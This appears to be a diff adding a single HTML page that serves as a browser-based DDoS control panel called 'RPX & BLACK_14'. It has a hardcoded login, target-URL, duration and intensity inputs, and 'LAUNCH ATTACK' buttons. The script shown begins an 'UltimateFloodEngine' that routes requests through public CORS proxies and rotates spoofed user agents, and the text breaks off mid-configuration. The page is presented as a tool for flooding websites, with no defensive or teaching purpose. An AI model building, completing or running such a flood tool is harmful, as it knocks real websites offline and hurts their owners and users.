@@ -1,0 +1,1539 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚡ APEX DESTROYER v3.0</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;500;700&display=swap');
+        
+        :root {
+            --neon-green: #00ff9d;
+            --neon-blue: #00e0ff;
+            --neon-purple: #bd00ff;
+            --neon-red: #ff0055;
+            --dark-bg: #0a0a15;
+            --darker-bg: #050510;
+            --panel-bg: rgba(10, 15, 30, 0.85);
+            --glow-green: 0 0 20px #00ff9d, 0 0 40px #00ff9d, 0 0 60px #00ff9d;
+            --glow-blue: 0 0 20px #00e0ff, 0 0 40px #00e0ff, 0 0 60px #00e0ff;
+            --glow-purple: 0 0 20px #bd00ff, 0 0 40px #bd00ff, 0 0 60px #bd00ff;
+            --glow-red: 0 0 20px #ff0055, 0 0 40px #ff0055, 0 0 60px #ff0055;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--darker-bg) 0%, var(--dark-bg) 100%);
+            color: white;
+            font-family: 'Rajdhani', sans-serif;
+            min-height: 100vh;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(0, 255, 157, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(0, 224, 255, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 50% 50%, rgba(189, 0, 255, 0.03) 0%, transparent 30%);
+        }
+        
+        /* Matrix Background */
+        #matrixCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.15;
+        }
+        
+        /* Login Container */
+        #loginContainer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            animation: pulseBackground 10s infinite alternate;
+        }
+        
+        @keyframes pulseBackground {
+            0% { background: rgba(5, 5, 16, 0.7); }
+            100% { background: rgba(10, 10, 25, 0.7); }
+        }
+        
+        .login-box {
+            background: var(--panel-bg);
+            border: 2px solid var(--neon-green);
+            border-radius: 20px;
+            padding: 50px 40px;
+            width: 100%;
+            max-width: 450px;
+            backdrop-filter: blur(20px);
+            box-shadow: var(--glow-green);
+            position: relative;
+            overflow: hidden;
+            transform-style: preserve-3d;
+            perspective: 1000px;
+        }
+        
+        .login-box::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue), var(--neon-purple), var(--neon-red));
+            border-radius: 22px;
+            z-index: -1;
+            filter: blur(20px);
+            opacity: 0.5;
+            animation: rotateBorder 4s linear infinite;
+        }
+        
+        @keyframes rotateBorder {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .login-title {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .main-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 2.8rem;
+            font-weight: 900;
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 255, 157, 0.5);
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+            animation: titleGlow 2s infinite alternate;
+        }
+        
+        @keyframes titleGlow {
+            0% { text-shadow: 0 0 30px rgba(0, 255, 157, 0.5); }
+            100% { text-shadow: 0 0 50px rgba(0, 255, 157, 0.8), 0 0 70px rgba(0, 224, 255, 0.6); }
+        }
+        
+        .login-subtitle {
+            color: var(--neon-blue);
+            font-size: 1.1rem;
+            opacity: 0.8;
+            font-family: 'Orbitron', monospace;
+        }
+        
+        .credentials-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--neon-blue);
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+            animation: float 6s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .credential-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(0, 20, 40, 0.5);
+            border-radius: 8px;
+        }
+        
+        .credential-item:last-child {
+            margin-bottom: 0;
+        }
+        
+        .cred-label {
+            color: var(--neon-green);
+            font-weight: bold;
+            font-family: 'Orbitron', monospace;
+        }
+        
+        .cred-value {
+            color: white;
+            font-family: 'Orbitron', monospace;
+            background: rgba(0, 255, 157, 0.1);
+            padding: 5px 15px;
+            border-radius: 20px;
+            border: 1px solid var(--neon-green);
+        }
+        
+        .login-form {
+            margin-top: 30px;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .input-label {
+            display: block;
+            color: var(--neon-blue);
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-family: 'Orbitron', monospace;
+            font-size: 0.9rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(0, 10, 20, 0.7);
+            border: 2px solid var(--neon-blue);
+            border-radius: 10px;
+            color: white;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.1rem;
+            transition: all 0.3s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: var(--neon-green);
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.3);
+            background: rgba(0, 20, 30, 0.7);
+        }
+        
+        .login-button {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
+            border: none;
+            border-radius: 10px;
+            color: var(--darker-bg);
+            font-family: 'Orbitron', monospace;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .login-button:hover::before {
+            left: 100%;
+        }
+        
+        .login-button:hover {
+            transform: translateY(-3px);
+            box-shadow: var(--glow-green);
+        }
+        
+        .login-button:active {
+            transform: translateY(1px);
+        }
+        
+        .error-message {
+            color: var(--neon-red);
+            text-align: center;
+            margin-top: 20px;
+            font-family: 'Orbitron', monospace;
+            display: none;
+            animation: errorPulse 1s infinite;
+        }
+        
+        @keyframes errorPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Dashboard Styles */
+        #dashboard {
+            display: none;
+            min-height: 100vh;
+        }
+        
+        /* Header */
+        .dashboard-header {
+            background: rgba(10, 15, 30, 0.9);
+            border-bottom: 2px solid var(--neon-green);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 2rem;
+            color: var(--neon-green);
+            filter: drop-shadow(0 0 10px var(--neon-green));
+            animation: spin 10s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .logo-text {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.8rem;
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+            letter-spacing: 2px;
+        }
+        
+        .user-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .user-greeting {
+            color: var(--neon-blue);
+            font-family: 'Orbitron', monospace;
+            font-size: 1rem;
+        }
+        
+        .username-display {
+            background: linear-gradient(45deg, var(--neon-purple), var(--neon-red));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: bold;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.2rem;
+        }
+        
+        .logout-btn {
+            background: transparent;
+            border: 2px solid var(--neon-red);
+            color: var(--neon-red);
+            padding: 10px 25px;
+            border-radius: 30px;
+            font-family: 'Orbitron', monospace;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+        
+        .logout-btn:hover {
+            background: var(--neon-red);
+            color: var(--darker-bg);
+            box-shadow: var(--glow-red);
+            transform: scale(1.05);
+        }
+        
+        /* Main Content */
+        .dashboard-content {
+            padding: 30px;
+            max-width: 1600px;
+            margin: 0 auto;
+        }
+        
+        /* Stats Grid */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-bottom: 40px;
+        }
+        
+        .stat-card {
+            background: var(--panel-bg);
+            border: 2px solid var(--neon-blue);
+            border-radius: 15px;
+            padding: 25px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            transform: translateY(-10px);
+            box-shadow: var(--glow-blue);
+            border-color: var(--neon-green);
+        }
+        
+        .stat-card:nth-child(2) { border-color: var(--neon-green); }
+        .stat-card:nth-child(3) { border-color: var(--neon-purple); }
+        .stat-card:nth-child(4) { border-color: var(--neon-red); }
+        
+        .stat-card:nth-child(2):hover { box-shadow: var(--glow-green); }
+        .stat-card:nth-child(3):hover { box-shadow: var(--glow-purple); }
+        .stat-card:nth-child(4):hover { box-shadow: var(--glow-red); }
+        
+        .stat-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: var(--neon-blue);
+        }
+        
+        .stat-card:nth-child(2) .stat-icon { color: var(--neon-green); }
+        .stat-card:nth-child(3) .stat-icon { color: var(--neon-purple); }
+        .stat-card:nth-child(4) .stat-icon { color: var(--neon-red); }
+        
+        .stat-value {
+            font-size: 3rem;
+            font-family: 'Orbitron', monospace;
+            font-weight: 900;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, var(--neon-blue), white);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stat-card:nth-child(2) .stat-value {
+            background: linear-gradient(45deg, var(--neon-green), white);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stat-card:nth-child(3) .stat-value {
+            background: linear-gradient(45deg, var(--neon-purple), white);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stat-card:nth-child(4) .stat-value {
+            background: linear-gradient(45deg, var(--neon-red), white);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stat-label {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 1rem;
+            font-family: 'Rajdhani', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        /* Control Panel */
+        .control-panel {
+            background: var(--panel-bg);
+            border: 2px solid var(--neon-green);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 40px;
+            box-shadow: 0 0 50px rgba(0, 255, 157, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .control-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 5px;
+            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue), var(--neon-purple), var(--neon-red));
+            animation: slide 3s linear infinite;
+        }
+        
+        @keyframes slide {
+            0% { background-position: -200px 0; }
+            100% { background-position: 200px 0; }
+        }
+        
+        .panel-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 2rem;
+            margin-bottom: 30px;
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-align: center;
+        }
+        
+        .input-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .input-container {
+            position: relative;
+        }
+        
+        .input-container label {
+            display: block;
+            color: var(--neon-blue);
+            margin-bottom: 10px;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.1rem;
+        }
+        
+        .panel-input {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(0, 15, 30, 0.7);
+            border: 2px solid var(--neon-blue);
+            border-radius: 10px;
+            color: white;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.1rem;
+            transition: all 0.3s;
+        }
+        
+        .panel-input:focus {
+            outline: none;
+            border-color: var(--neon-green);
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.3);
+        }
+        
+        .intensity-selector {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .intensity-btn {
+            flex: 1;
+            padding: 15px;
+            background: rgba(0, 15, 30, 0.7);
+            border: 2px solid var(--neon-blue);
+            border-radius: 10px;
+            color: white;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+        
+        .intensity-btn:hover {
+            transform: translateY(-3px);
+            border-color: var(--neon-green);
+        }
+        
+        .intensity-btn.active {
+            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
+            color: var(--darker-bg);
+            border-color: transparent;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.3);
+        }
+        
+        .attack-buttons {
+            display: flex;
+            gap: 30px;
+            margin-top: 40px;
+        }
+        
+        .attack-btn {
+            flex: 1;
+            padding: 25px;
+            border: none;
+            border-radius: 15px;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.3rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .start-btn {
+            background: linear-gradient(45deg, var(--neon-green), #00cc7a);
+            color: var(--darker-bg);
+        }
+        
+        .start-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--glow-green);
+        }
+        
+        .stop-btn {
+            background: linear-gradient(45deg, var(--neon-red), #cc0044);
+            color: white;
+        }
+        
+        .stop-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: var(--glow-red);
+        }
+        
+        /* Console */
+        .console-container {
+            background: rgba(0, 5, 15, 0.9);
+            border: 2px solid var(--neon-purple);
+            border-radius: 15px;
+            padding: 25px;
+            height: 400px;
+            overflow: hidden;
+            box-shadow: 0 0 30px rgba(189, 0, 255, 0.1);
+        }
+        
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(189, 0, 255, 0.3);
+        }
+        
+        .console-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 1.5rem;
+            color: var(--neon-purple);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .console-controls {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .console-btn {
+            background: rgba(189, 0, 255, 0.2);
+            border: 1px solid var(--neon-purple);
+            color: var(--neon-purple);
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .console-btn:hover {
+            background: var(--neon-purple);
+            color: var(--darker-bg);
+        }
+        
+        .console-output {
+            height: calc(100% - 60px);
+            overflow-y: auto;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            line-height: 1.4;
+            padding-right: 10px;
+        }
+        
+        .console-output::-webkit-scrollbar {
+            width: 8px;
+        }
+        
+        .console-output::-webkit-scrollbar-track {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 4px;
+        }
+        
+        .console-output::-webkit-scrollbar-thumb {
+            background: var(--neon-purple);
+            border-radius: 4px;
+        }
+        
+        .log-entry {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(189, 0, 255, 0.1);
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-5px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .log-time {
+            color: var(--neon-blue);
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .log-message {
+            color: white;
+        }
+        
+        .log-success { color: var(--neon-green); }
+        .log-error { color: var(--neon-red); }
+        .log-warning { color: #ffaa00; }
+        .log-info { color: var(--neon-blue); }
+        
+        /* Attack Status */
+        .attack-status {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            font-family: 'Orbitron', monospace;
+            font-size: 1.2rem;
+            font-weight: bold;
+            letter-spacing: 2px;
+            animation: statusPulse 2s infinite;
+        }
+        
+        @keyframes statusPulse {
+            0%, 100% { box-shadow: 0 0 20px rgba(0, 255, 157, 0.3); }
+            50% { box-shadow: 0 0 40px rgba(0, 255, 157, 0.6); }
+        }
+        
+        .status-active {
+            background: linear-gradient(45deg, rgba(0, 255, 157, 0.1), rgba(0, 224, 255, 0.1));
+            border: 2px solid var(--neon-green);
+            color: var(--neon-green);
+        }
+        
+        .status-inactive {
+            background: linear-gradient(45deg, rgba(255, 0, 85, 0.1), rgba(189, 0, 255, 0.1));
+            border: 2px solid var(--neon-red);
+            color: var(--neon-red);
+        }
+        
+        /* Progress Bar */
+        .progress-container {
+            margin-top: 20px;
+        }
+        
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: bold;
+            color: var(--neon-blue);
+        }
+        
+        .progress-bar {
+            height: 12px;
+            background: rgba(0, 15, 30, 0.7);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--neon-green), var(--neon-blue), var(--neon-purple));
+            border-radius: 6px;
+            width: 0%;
+            transition: width 0.5s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            animation: progressShine 2s infinite;
+        }
+        
+        @keyframes progressShine {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Matrix Background -->
+    <canvas id="matrixCanvas"></canvas>
+    
+    <!-- Login Screen -->
+    <div id="loginContainer">
+        <div class="login-box">
+            <div class="login-title">
+                <div class="main-title">RPX & BLACK_14</div>
+                <div class="login-subtitle">v3.0 - LEGENDARY EDITION</div>
+            </div>
+            
+         
+            
+            <div class="login-form">
+                <div class="input-group">
+                    <label class="input-label">ENTER USERNAME</label>
+                    <input type="text" id="usernameInput" class="input-field" placeholder="Enter your username">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">ENTER PASSWORD</label>
+                    <input type="password" id="passwordInput" class="input-field" placeholder="Enter your password">
+                </div>
+                
+                <button id="loginButton" class="login-button">
+                    <i class="fas fa-terminal"></i> ACCESS CONTROL PANEL
+                </button>
+                
+                <div id="loginError" class="error-message">
+                    <i class="fas fa-exclamation-triangle"></i> INVALID CREDENTIALS
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Dashboard -->
+    <div id="dashboard">
+        <!-- Header -->
+        <header class="dashboard-header">
+            <div class="header-left">
+                <div class="logo">
+                    <div class="logo-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <div class="logo-text">RPX & BLACK_14</div>
+                </div>
+                <div class="user-info">
+                    <span class="user-greeting">WELCOME,</span>
+                    <span class="username-display" id="displayUsername">USER</span>
+                </div>
+            </div>
+            <button id="logoutButton" class="logout-btn">
+                <i class="fas fa-sign-out-alt"></i> LOGOUT
+            </button>
+        </header>
+        
+        <!-- Main Content -->
+        <main class="dashboard-content">
+            <!-- Stats Grid -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-bullseye"></i>
+                    </div>
+                    <div class="stat-value" id="totalRequests">0</div>
+                    <div class="stat-label">TOTAL REQUESTS</div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-tachometer-alt"></i>
+                    </div>
+                    <div class="stat-value" id="requestRate">0/s</div>
+                    <div class="stat-label">REQUEST RATE</div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-percentage"></i>
+                    </div>
+                    <div class="stat-value" id="successRate">100%</div>
+                    <div class="stat-label">SUCCESS RATE</div>
+                </div>
+                
+                <div class="stat-card">
+                    <div class="stat-icon">
+                        <i class="fas fa-clock"></i>
+                    </div>
+                    <div class="stat-value" id="elapsedTime">00:00:00</div>
+                    <div class="stat-label">ELAPSED TIME</div>
+                </div>
+            </div>
+            
+            <!-- Control Panel -->
+            <div class="control-panel">
+                <h2 class="panel-title">
+                    <i class="fas fa-crosshairs"></i> ATTACK CONTROLS
+                </h2>
+                
+                <div class="input-row">
+                    <div class="input-container">
+                        <label for="targetUrl">
+                            <i class="fas fa-globe"></i> TARGET URL
+                        </label>
+                        <input type="text" id="targetUrl" class="panel-input" 
+                               placeholder="https://target-website.com" 
+                               value="https://">
+                    </div>
+                    
+                    <div class="input-container">
+                        <label for="attackDuration">
+                            <i class="fas fa-hourglass-half"></i> DURATION (SECONDS)
+                        </label>
+                        <input type="number" id="attackDuration" class="panel-input" 
+                               value="3600" min="60" max="86400">
+                    </div>
+                </div>
+                
+                <div class="input-container">
+                    <label>
+                        <i class="fas fa-fire"></i> ATTACK INTENSITY
+                    </label>
+                    <div class="intensity-selector">
+                        <button class="intensity-btn" data-intensity="low">LOW</button>
+                        <button class="intensity-btn active" data-intensity="medium">MEDIUM</button>
+                        <button class="intensity-btn" data-intensity="high">HIGH</button>
+                        <button class="intensity-btn" data-intensity="extreme">EXTREME</button>
+                    </div>
+                </div>
+                
+                <div class="attack-buttons">
+                    <button id="startAttackBtn" class="attack-btn start-btn">
+                        <i class="fas fa-play"></i> LAUNCH ATTACK
+                    </button>
+                    <button id="stopAttackBtn" class="attack-btn stop-btn">
+                        <i class="fas fa-stop"></i> STOP ATTACK
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Progress Bar -->
+            <div class="progress-container">
+                <div class="progress-header">
+                    <span>ATTACK PROGRESS</span>
+                    <span id="progressPercent">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+            
+            <!-- Attack Status -->
+            <div id="attackStatus" class="attack-status status-inactive">
+                <i class="fas fa-pause-circle"></i> SYSTEM READY
+            </div>
+            
+            <!-- Console -->
+            <div class="console-container">
+                <div class="console-header">
+                    <div class="console-title">
+                        <i class="fas fa-terminal"></i> ATTACK CONSOLE
+                    </div>
+                    <div class="console-controls">
+                        <button id="clearConsoleBtn" class="console-btn">
+                            <i class="fas fa-trash"></i> CLEAR
+                        </button>
+                        <button id="exportLogsBtn" class="console-btn">
+                            <i class="fas fa-download"></i> EXPORT
+                        </button>
+                    </div>
+                </div>
+                <div class="console-output" id="consoleOutput">
+                    <div class="log-entry">
+                        <span class="log-time">[SYSTEM]</span>
+                        <span class="log-message log-info">RPX & BLACK_14 v3.0 Initialized</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[SYSTEM]</span>
+                        <span class="log-message log-info">Pre-configured credentials loaded: user/pass</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[SYSTEM]</span>
+                        <span class="log-message log-info">Legendary interface engine activated</span>
+                    </div>
+                    <div class="log-entry">
+                        <span class="log-time">[SYSTEM]</span>
+                        <span class="log-message log-success">Ready for destruction. Enter target URL to begin.</span>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <script>
+        // ==================== MATRIX BACKGROUND ====================
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        
+        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$+-*/=%\"'#&_(),.;:?!\\|{}<>[]^~";
+        const charArray = chars.split("");
+        const fontSize = 14;
+        const columns = canvas.width / fontSize;
+        
+        const drops = [];
+        for (let i = 0; i < columns; i++) {
+            drops[i] = Math.floor(Math.random() * canvas.height / fontSize) * fontSize;
+        }
+        
+        function drawMatrix() {
+            ctx.fillStyle = "rgba(5, 5, 16, 0.04)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            ctx.fillStyle = "#00ff9d";
+            ctx.font = `${fontSize}px monospace`;
+            
+            for (let i = 0; i < drops.length; i++) {
+                const text = charArray[Math.floor(Math.random() * charArray.length)];
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    drops[i] = 0;
+                }
+                drops[i]++;
+            }
+        }
+        
+        setInterval(drawMatrix, 35);
+        
+        window.addEventListener('resize', function() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+        
+        // ==================== AUTHENTICATION ====================
+        const USERNAME = "black_14";
+        const PASSWORD = "BLACK_14forddos";
+        
+        const loginContainer = document.getElementById('loginContainer');
+        const dashboard = document.getElementById('dashboard');
+        const loginButton = document.getElementById('loginButton');
+        const logoutButton = document.getElementById('logoutButton');
+        const loginError = document.getElementById('loginError');
+        const displayUsername = document.getElementById('displayUsername');
+        
+        // Auto-focus on username input
+        document.getElementById('usernameInput').focus();
+        
+        // Login function
+        loginButton.addEventListener('click', function() {
+            const username = document.getElementById('usernameInput').value.trim();
+            const password = document.getElementById('passwordInput').value.trim();
+            
+            if (username === USERNAME && password === PASSWORD) {
+                // Successful login
+                displayUsername.textContent = username.toUpperCase();
+                loginContainer.style.display = 'none';
+                dashboard.style.display = 'block';
+                logToConsole(`User '${username}' authenticated successfully`, 'success');
+                logToConsole('Control panel unlocked', 'success');
+            } else {
+                // Failed login
+                loginError.style.display = 'block';
+                document.getElementById('passwordInput').value = '';
+                document.getElementById('passwordInput').focus();
+                
+                // Shake animation
+                loginContainer.style.animation = 'none';
+                setTimeout(() => {
+                    loginContainer.style.animation = 'errorShake 0.5s';
+                }, 10);
+                
+                setTimeout(() => {
+                    loginContainer.style.animation = '';
+                }, 500);
+            }
+        });
+        
+        // Allow Enter key to login
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                loginButton.click();
+            }
+        });
+        
+        // Logout function
+        logoutButton.addEventListener('click', function() {
+            if (confirm('Logout? Any active attack will be stopped.')) {
+                stopAttack();
+                dashboard.style.display = 'none';
+                loginContainer.style.display = 'flex';
+                document.getElementById('passwordInput').value = '';
+                document.getElementById('usernameInput').value = '';
+                document.getElementById('usernameInput').focus();
+                logToConsole('User logged out', 'info');
+            }
+        });
+        
+        // ==================== ATTACK ENGINE ====================
+        class UltimateFloodEngine {
+            constructor() {
+                this.isAttacking = false;
+                this.startTime = 0;
+                this.totalRequests = 0;
+                this.successfulRequests = 0;
+                this.attackWorkers = [];
+                this.attackDuration = 3600;
+                this.targetUrl = '';
+                this.intensity = 'medium';
+                this.proxies = [
+                    'https://cors-anywhere.herokuapp.com/',
+                    'https://api.allorigins.win/raw?url=',
+                    'https://thingproxy.freeboard.io/fetch/',
+                    'https://corsproxy.io/?',
+                    ''
+                ];
+                this.userAgents = this.generateUserAgents();
+                this.attackInterval = null;
+            }
+            
+            generateUserAgents() {
+                return [
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
+                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
+                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
+                ];
+            }
+            
+            startAttack(target, duration, intensity) {
+                if (this.isAttacking) return;
+                
+                this.isAttacking = true;
+                this.targetUrl = target;
+                this.startTime = Date.now();
+                this.totalRequests = 0;
+                this.successfulRequests = 0;
+                this.attackDuration = duration;
+                this.intensity = intensity;
+                
+                logToConsole(`🚀 LAUNCHING ULTIMATE ATTACK`, 'success');
+                logToConsole(`🎯 TARGET: ${target}`, 'info');
+                logToConsole(`⚡ INTENSITY: ${intensity.toUpperCase()}`, 'info');
+                logToConsole(`⏱️ DURATION: ${duration} seconds`, 'info');
+                
+                // Calculate parameters based on intensity
+                let batchSize, interval;
+                switch(intensity) {
+                    case 'low':
+                        batchSize = 100;
+                        interval = 50;
+                        break;
+                    case 'medium':
+                        batchSize = 300;
+                        interval = 20;
